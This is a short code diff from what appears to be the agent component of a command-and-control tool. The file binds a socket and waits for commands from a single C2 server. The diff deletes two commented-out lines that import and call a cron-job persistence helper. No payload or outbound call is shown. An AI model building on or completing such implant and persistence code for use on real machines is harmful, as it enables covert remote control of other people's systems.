@@ -6,7 +6,6 @@ sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../')
 
 from protocol import validator
 from agent.agent_connection_handler import ConnectionHandler
-# from agent.persistency import cronjob_creator
 import persistency
 import socket
 import argparse
@@ -86,8 +85,6 @@ class ThreadedServer:
         self.server_socket.bind((self.src_ip, self.src_port))
         print(f"[+] Server listening on {self.src_ip}:{self.src_port}")
         self.server_socket.listen(1)  # we expect to receive commands from only one connecting C2 server
-
-        # cronjob_creator.create(self.src_port) # register the server in cron job
 
         print(f"[+] Waiting for incoming connections")
         try:
